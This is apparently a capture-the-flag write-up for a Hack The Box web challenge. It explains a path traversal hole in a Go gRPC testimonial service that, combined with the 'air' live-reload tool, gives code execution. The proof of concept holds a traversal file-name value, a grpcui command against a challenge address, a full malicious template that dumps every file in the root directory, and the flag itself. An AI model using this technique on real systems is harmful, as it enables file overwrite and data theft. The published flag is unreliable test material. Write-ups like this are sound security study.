# Testimonial - Easy

In this challenge, participants are provided with a website and the Golang source code. 


## Solution

Actually the vulnerability lies in GRPC service. The GRPC service vulnerable to Arbitrary File Write within this code:

> /challenge/grpc.go
> ```go
> func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
> 	if req.Customer == "" {
> 		return nil, errors.New("Name is required")
> 	}
> 	if req.Testimonial == "" {
> 		return nil, errors.New("Content is required")
> 	}
> 
> 	err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
> 	if err != nil {
> 		return nil, err
> 	}
> 
> 	return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
> }
> ```

The `SubmitTestimonial` function save the inputted testimonial in a file with filename = inputted customer. However the **customer** input is passed into `os.WriteFile` function without sanitization, so we can input with Path Traversal payload to climb up the directory and write the content into our file location that we want.

In other hand, challenge using `air` to run the Golang application. `air` is a tool to run the Golang application with Live reload feature, everything that has been changed in the Go source code, `air` automatically re-build and re-run the Go application.
> /build-docker.sh
> ```bash
> #!/bin/sh
> 
> # Change flag name
> mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
> 
> # Secure entrypoint
> chmod 600 /entrypoint.sh
> 
> # Start application
> air
> ```

With this, we can overwrite one of the Golang source code with our Golang code to perform Code Execution and get a flag.


## Proof of Concept
1. Connect to grpc services with `grpcui`
   ```
   ./grpcui -plaintext -proto challenge/pb/ptypes.proto 83.136.253.78:37612
   ```
   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/14c042ab-07c8-4ec9-992f-282eb5789289)

2. Overwrite the Template file and change the functionality to read all files in `/` directory.
   ```
   Customer: ../../../../challenge/view/home/index.templ

   Testimonial:
   package home

    import (
    	"htbchal/view/layout"
    	"io/fs"	
    	"fmt"
    	"os"
    )
    
    templ Index() {
    	@layout.App(true) {
    <nav class="navbar navbar-expand-lg navbar-dark bg-black">
      <div class="container-fluid">
        <a class="navbar-brand" href="/">The Fray</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav ml-auto">
                <li class="nav-item active">
                    <a class="nav-link" href="/">Home</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="javascript:void();">Factions</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="javascript:void();">Trials</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="javascript:void();">Contact</a>
                </li>
            </ul>
        </div>
      </div>
    </nav>
    
    <div class="container">
      <section class="jumbotron text-center">
          <div class="container mt-5">
              <h1 class="display-4">Welcome to The Fray</h1>
              <p class="lead">Assemble your faction and prove you're the last one standing!</p>
              <a href="javascript:void();" class="btn btn-primary btn-lg">Get Started</a>
          </div>
      </section>
    
      <section class="container mt-5">
          <h2 class="text-center mb-4">What Others Say</h2>
          <div class="row">
              @Testimonials()
          </div>
      </section>
    
    
      <div class="row mt-5 mb-5">
        <div class="col-md">
          <h2 class="text-center mb-4">Submit Your Testimonial</h2>
          <form method="get" action="/">
            <div class="form-group">
              <label class="mt-2" for="testimonialText">Your Testimonial</label>
              <textarea class="form-control mt-2" id="testimonialText" rows="3" name="testimonial"></textarea>
            </div>
            <div class="form-group">
              <label class="mt-2" for="testifierName">Your Name</label>
              <input type="text" class="form-control mt-2" id="testifierName" name="customer"/>
            </div>
            <button type="submit" class="btn btn-primary mt-4">Submit Testimonial</button>
          </form>
        </div>
      </div>
    </div>
    
    <footer class="bg-black text-white text-center py-3">
        <p>&copy; 2024 The Fray. All Rights Reserved.</p>
    </footer>
    	}
    }
    
    func GetTestimonials() []string {
    	fsys := os.DirFS("../../../../../")	
    	files, err := fs.ReadDir(fsys, ".")
    	if err != nil {
    		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
    	}
    	var res []string
    	for _, file := range files {
    		fileContent, _ := fs.ReadFile(fsys, file.Name())
    		res = append(res, string(fileContent))		
    	}
    	return res
    }
    
    templ Testimonials() {
      for _, item := range GetTestimonials() {
        <div class="col-md-4">
            <div class="card mb-4">
                <div class="card-body">
                    <p class="card-text">"{item}"</p>
                    <p class="text-muted">- Anonymous Testifier</p>
                </div>
            </div>
        </div>
      }
    }```

![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/0c94397b-f635-4c83-80ae-69fc8856c464)
Submitted successfully.
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/bc56dcf0-d10c-4a5e-9c5c-c9031727157d)
Navigating to home website to retrieve the flag.
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/e3dc72bb-0355-42a6-bd9f-0c7ee8463016)


## Flag
HTB{w34kly_t35t3d_t3mplate5}
